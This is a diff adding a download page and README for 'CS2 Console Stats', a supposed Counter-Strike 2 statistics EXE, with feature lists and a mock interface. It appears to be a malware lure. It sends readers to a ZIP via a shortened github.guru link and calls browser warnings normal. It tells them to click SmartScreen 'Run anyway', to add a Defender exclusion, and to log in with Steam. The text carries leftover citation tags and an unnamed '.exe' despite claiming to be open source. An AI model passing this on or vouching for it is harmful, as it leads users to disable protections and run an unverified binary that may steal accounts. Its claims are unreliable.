@@ -1,0 +1,341 @@
+ ██████╗███████╗██████╗      ██████╗ ██████╗ ███╗   ██╗███████╗ ██████╗ ██╗     ███████╗
+██╔════╝██╔════╝╚════██╗    ██╔════╝██╔═══██╗████╗  ██║██╔════╝██╔═══██╗██║     ██╔════╝
+██║     ███████╗ █████╔╝    ██║     ██║   ██║██╔██╗ ██║███████╗██║   ██║██║     █████╗  
+██║     ╚════██║██╔═══╝     ██║     ██║   ██║██║╚██╗██║╚════██║██║   ██║██║     ██╔══╝  
+╚██████╗███████║███████╗    ╚██████╗╚██████╔╝██║ ╚████║███████║╚██████╔╝███████╗███████╗
+ ╚═════╝╚══════╝╚══════╝     ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝
+
+CS2 CONSOLE STATS is a professional desktop application for Counter-Strike 2 players that provides real-time match statistics, advanced performance analytics, and comprehensive historical data tracking. Unlike web-based trackers, this EXE software runs locally on your machine, pulling data directly from Steam API and local demo files for instant, private, and detailed stat analysis without uploading your data to third-party servers. [citation:1][citation:5][citation:7]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+► DOWNLOAD: https://github.guru/s/gvZmzFAo
+► PASSWORD: None
+► FORMAT: ZIP containing standalone EXE + configuration files
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📥 DOWNLOAD & INSTALLATION INSTRUCTIONS
+
+STEP 1: Download the ZIP file from the link above
+STEP 2: Right-click the downloaded ZIP → Extract All
+STEP 3: Choose a destination folder (C:\CS2_Stats or Desktop recommended)
+STEP 4: Open the extracted folder
+STEP 5: Double-click .exe to launch
+STEP 6: Log in with your Steam account (secure local authentication)
+STEP 7: Start tracking your matches automatically
+
+⚠ NOTE: Windows SmartScreen may show warning - click "More info" then "Run anyway"
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+✨ KEY FEATURES
+
+• Real-time match tracking — live stats during active CS2 matches [citation:5]
+• Premier rank & ELO tracking — monitor your rank progression over time
+• Advanced performance metrics — ADR, HS%, KAST, Rating 2.0, and more [citation:5][citation:9]
+• Weapon-specific analytics — accuracy, kills, headshot percentage per weapon
+• Demo file analysis — parse local .dem files for deep tactical insights [citation:2][citation:6][citation:9]
+• Heatmap generation — visualize your positioning and kill zones
+• Session history — track all matches in current gaming session
+• Enemy stats — see detailed performance of opponents you face
+• Export capabilities — save stats as CSV, JSON, or PDF reports [citation:2]
+• Steam integration — secure local authentication, no cloud upload [citation:3]
+• Offline mode — analyze demos without internet connection
+• FACEIT sync — optional integration for FACEIT match stats [citation:5][citation:10]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+⚙ SYSTEM REQUIREMENTS
+
+┌─────────────────┬─────────────────────────┬─────────────────────────┐
+│ COMPONENT       │ MINIMUM                 │ RECOMMENDED             │
+├─────────────────┼─────────────────────────┼─────────────────────────┤
+│ OS              │ Windows 10 (64-bit)     │ Windows 11 (64-bit)     │
+│ Processor       │ Intel Core i3 / AMD      │ Intel Core i5 / AMD     │
+│ Memory          │ 4 GB RAM                │ 8 GB RAM                │
+│ Storage         │ 200 MB free space       │ 500 MB SSD              │
+│ Graphics        │ DirectX 11 compatible   │ Dedicated GPU, 2GB VRAM │
+│ Internet        │ Required for Steam API  │ Broadband connection    │
+│ Steam           │ Steam client installed  │ Latest version          │
+└─────────────────┴─────────────────────────┴─────────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📊 STATISTICS TRACKED
+
+┌───────────────────┬─────────────────────────────────────────────────┐
+│ CATEGORY          │ METRICS                                         │
+├───────────────────┼─────────────────────────────────────────────────┤
+│ Core Stats        │ Kills, Deaths, Assists, KD Ratio, ADR, Rating  │
+│ Headshots         │ HS count, HS percentage, 1-tap kills           │
+│ Utility           │ Utility damage, grenade effectiveness, flashes │
+│ Clutch Situations │ 1vX wins, clutch success rate, pressure rounds │
+│ Entry Fragging    │ Entry kills, entry deaths, trade kills         │
+│ Multi-Kills       │ 2K, 3K, 4K, Ace rounds                         │
+│ Weapon Stats      │ Accuracy, kills per weapon, favorite weapons   │
+│ Map Performance   │ Win rate per map, average rating per map       │
+│ Economy           │ Eco wins, force buy wins, conversion rate      │
+│ Positioning       │ Crosshair placement, site holds, rotations     │
+└───────────────────┴─────────────────────────────────────────────────┘
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔧 HOW TO USE
+
+LIVE MATCH TRACKING
+────────────────────
+1. Launch CS2 Console Stats EXE
+2. Log in with Steam (secure local auth)
+3. Launch CS2 and start playing
+4. Stats appear automatically in real-time
+5. Press F9 during match for quick overlay
+
+DEMO ANALYSIS
+────────────────────
+1. Download your CS2 demo files (.dem)
+2. Place them in the "demos" folder inside installation directory
+3. Click "Import Demo" in the application
+4. Select demo file for detailed analysis
+5. View round-by-round breakdowns and heatmaps [citation:2][citation:6][citation:9]
+
+HISTORICAL TRACKING
+────────────────────
+1. Application automatically syncs with Steam match history
+2. View last 20+ matches with full statistics
+3. Track progress over days, weeks, months
+4. Compare performance across different maps
+
+EXPORT REPORTS
+────────────────────
+1. Select matches or session to export
+2. Choose format (CSV, JSON, PDF)
+3. Click "Export" to save report
+4. Share with coaches or teammates [citation:2]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📄 README.TXT (extracted from ZIP)
+
+==================================================
+CS2 CONSOLE STATS v2.4.0
+==================================================
+
+Thank you for downloading CS2 Console Stats!
+
+This professional tool provides comprehensive
+statistics and analytics for Counter-Strike 2 players.
+
+QUICK START:
+────────────────
+1. Extract ALL files from this ZIP archive
+2. Run .exe
+3. Click "Login with Steam" (secure local auth)
+4. Launch CS2 and start playing
+5. Stats appear automatically!
+
+FEATURES:
+────────────────
+• Live match tracking with real-time updates
+• Premier rank and ELO monitoring
+• Advanced metrics (ADR, HS%, Rating, KAST)
+• Weapon-specific performance analytics
+• Demo file analysis for deep tactical review
+• Session history and export capabilities
+• Heatmap generation for positioning analysis
+
+HOTKEYS:
+────────────────
+F9  - Toggle overlay during match
+F10 - Quick stats snapshot
+F11 - Export current match data
+F12 - Screenshot stats window
+
+TROUBLESHOOTING:
+────────────────
+• If Steam login fails, ensure Steam client is running
+• If stats don't appear, check "Auto-refresh" in settings
+• For demo analysis, place .dem files in /demos folder
+• Windows Defender: Add folder exclusion if needed
+
+VERSION: 2.4.0
+RELEASE: March 2026
+
+==================================================
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📜 CHANGELOG.TXT
+
+v2.4.0 (March 2026)
+────────────────────
+• Added Premier rank tracking with ELO history graphs
+• New heatmap visualization engine
+• FACEIT sync integration (optional)
+• Export to PDF with custom templates
+• Fixed Steam API authentication issues
+• Performance improvements for large demo files
+
+
+🏷️ TAGS
+
+cs2 stats, counter strike 2 statistics, cs2 performance tracker, premier rank tracker, cs2 elo monitor, cs2 demo analyzer, cs2 match history, cs2 headshot tracker, cs2 adr calculator, cs2 rating 2.0, cs2 weapon stats, cs2 heatmap generator, cs2 live stats overlay, cs2 analytics tool, cs2 performance metrics, cs2 training tool, cs2 coaching software, steam stats tracker, faceit stats integration, cs2 demo parser
+
+
+⚠ DISCLAIMER
+
+This software is not affiliated with or endorsed by Valve Corporation or Counter-Strike 2. All data is pulled from official Steam API and local demo files. This tool is for personal use and performance improvement only. Use in compliance with CS2 terms of service. [citation:1][citation:3][citation:10]
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🔗 DOWNLOAD LINKS
+
+► MAIN: https://github.guru/s/gvZmzFAo
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+YOUR BROWSER MAY SHOW A WARNING – THIS IS REGULAR FOR OPENSOURCE APP
+
+When downloading this open-source software, Chrome, Edge, Firefox, or other browsers may display a warning message such as:
+
+• "This file is not commonly downloaded and may be dangerous"
+• "Chromium could not verify the safety of this download"
+• "This type of file can harm your computer"
+
+╔══════════════════════════════════════════════════════════════════════════════════════╗
+                        ⚠ IMPORTANT DOWNLOAD NOTICE ⚠                              
+╚══════════════════════════════════════════════════════════════════════════════════════╝
+
+
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                     CS2 CONSOLE STATS v2.4.0                         [−][□][×] │
+├─────────────────────────────────────────────────────────────────────────────┤
+│  ┌─────────────────────────────────────────────────────────────────────┐    │
+│  │  🎮 MATCH OVERVIEW                                                  │    │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │    │
+│  │  │ Map: Mirage • Score: 13-8 • Duration: 32:45                 │    │    │
+│  │  │ K/D: 24-12 • ADR: 98.4 • HS%: 62% • Rating 2.1: 1.45       │    │    │
+│  │  │ Premier Rank: 18,500 • ELO Change: +254                     │    │    │
+│  │  └─────────────────────────────────────────────────────────────┘    │    │
+│  │  [🔄 REFRESH]                    [📊 DETAILED STATS]                 │    │
+│  └─────────────────────────────────────────────────────────────────────┘    │
+│                                                                             │
+│  ┌─────────────────────────────────────────────────────────────────────┐    │
+│  │  ⚙ STATS TRACKING                                          [⏷ HIDE]│    │
+│  ├─────────────────────────────────────────────────────────────────────┤    │
+│  │                                                                     │    │
+│  │  TRACKING MODE:                  DATA SOURCE:                       │    │
+│  │  (●) Live Match                    (●) Steam API                    │    │
+│  │  ( ) Demo Analysis                  ( ) Local Demos                  │    │
+│  │  ( ) Historical                     ( ) FACEIT Integration           │    │
+│  │  ( ) Session Stats                  ( ) Leetify Sync                 │    │
+│  │                                                                     │    │
+│  │  AUTO-REFRESH:                      EXPORT FORMAT:                  │    │
+│  │  [▼ Every 30 seconds              ]  [▼ CSV + JSON                 ]│    │
+│  │                                                                     │    │
+│  │  ADVANCED:  ☑ Track enemies in match                               │   │
+│  │             ☑ Show utility damage stats                            │   │
+│  │             ☐ Enable heatmap generation                            │   │
+│  │             ☐ Auto-save demos                                      │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📊 LIVE PERFORMANCE METRICS                                [⏷ HIDE]│   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  CURRENT MATCH (Mirage - Round 21/24)                               │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ Kills: 24 │ Deaths: 12 │ Assists: 5 │ KD: 2.0               │    │   │
+│  │  │ Headshots: 15 (62%) │ 1-Taps: 8 │ Clutches: 2              │    │   │
+│  │  │ ADR: 98.4 │ Damage dealt: 3240 │ Utility dmg: 186          │    │   │
+│  │  │ Entry kills: 4 │ Entry deaths: 2 │ Trade kills: 6          │    │   │
+│  │  │ Multi-kill rounds: 3 │ 4K: 1 │ Ace: 0                       │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  WEAPON STATS:                                                      │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ AK-47    │ 12 kills │ 86% HS │ 124 shots │ 68% acc         │    │   │
+│  │  │ M4A4     │ 8 kills  │ 62% HS │ 98 shots  │ 72% acc         │    │   │
+│  │  │ AWP      │ 3 kills  │ 33% HS │ 6 shots   │ 100% acc        │    │   │
+│  │  │ Deagle   │ 1 kill   │ 100% HS│ 4 shots   │ 50% acc         │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📈 ADVANCED ANALYTICS                                      [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  POSITIONING & UTILITY:                                             │   │
+│  │  • Crosshair placement: 87 ████████░░ (Top 12%)                    │   │
+│  │  • Utility usage: 74 ███████░░░░ (Avg 68)                          │   │
+│  │  • Team trade rate: 82% ████████░░ (Top 8%)                        │   │
+│  │  • Clutch success: 3/5 (60%) ██████░░░░                            │   │
+│  │                                                                     │   │
+│  │  ROUND ANALYSIS:                                                    │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ Pistol rounds: ████████░░ 4-2 (67% win)                     │    │   │
+│  │  │ Eco rounds:    ██░░░░░░░░ 1-5 (17% win)                     │    │   │
+│  │  │ Force buys:    ██████░░░░ 3-3 (50% win)                     │    │   │
+│  │  │ Full buys:     █████████░ 5-1 (83% win)                     │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  [🔬 DEEP ANALYSIS]                  [📈 TREND GRAPH]               │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  📋 SESSION HISTORY                                        [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │  ┌──────────┬───────────┬──────┬──────┬──────┬──────────┬─────────┐ │   │
+│  │  │ MAP      │ RESULT    │ K/D  │ ADR  │ HS%  │ RATING   │ DATE    │ │   │
+│  │  ├──────────┼───────────┼──────┼──────┼──────┼──────────┼─────────┤ │   │
+│  │  │ Mirage   │ WIN 13-8  │ 24-12│ 98.4 │ 62%  │ 1.45     │ Today   │ │   │
+│  │  │ Ancient  │ LOSS 9-13 │ 18-16│ 84.2 │ 48%  │ 1.12     │ Today   │ │   │
+│  │  │ Dust2    │ WIN 13-6  │ 28-10│ 112.5│ 71%  │ 1.78     │ Today   │ │   │
+│  │  │ Inferno  │ WIN 13-7  │ 21-14│ 92.3 │ 54%  │ 1.32     │ Today   │ │   │
+│  │  │ Nuke     │ LOSS 8-13 │ 15-17│ 76.8 │ 40%  │ 0.94     │ Today   │ │   │
+│  │  └──────────┴───────────┴──────┴──────┴──────┴──────────┴─────────┘ │   │
+│  │                                                                     │   │
+│  │  SESSION TOTALS: 5 matches • 3-2 record • +452 ELO • 86 kills      │   │
+│  │  [📊 EXPORT SESSION]                 [📁 SAVE REPORT]               │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │  🎯 ENEMY STATS (Current Match)                           [⏷ HIDE] │   │
+│  ├─────────────────────────────────────────────────────────────────────┤   │
+│  │                                                                     │   │
+│  │  TOP OPPONENTS:                                                     │   │
+│  │  ┌─────────────────────────────────────────────────────────────┐    │   │
+│  │  │ xX_Slayer_Xx • 18-15 • 1.18 rating • AWP • 58% HS           │    │   │
+│  │  │ ProGamer123 • 16-14 • 1.08 rating • Rifle • 62% HS          │    │   │
+│  │  │ CS2_King • 14-16 • 0.96 rating • Rifle • 44% HS             │    │   │
+│  │  │ AimGod • 12-18 • 0.82 rating • Entry • 75% HS               │    │   │
+│  │  │ ClutchMaster • 10-12 • 0.91 rating • Support • 30% HS       │    │   │
+│  │  └─────────────────────────────────────────────────────────────┘    │   │
+│  │                                                                     │   │
+│  │  [🔍 ANALYZE WEAKNESSES]            [⚠ REPORT SUSPECT]             │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                            │
+│  ├─────────────────────────────────────────────────────────────────────────┤
+│  │  STATUS: Live Tracking • 5 matches analyzed • v2.4.0 • 35,420 players  │
+│  └─────────────────────────────────────────────────────────────────────────┘
+└────────────────────────────────────────────────────────────────────────────┘
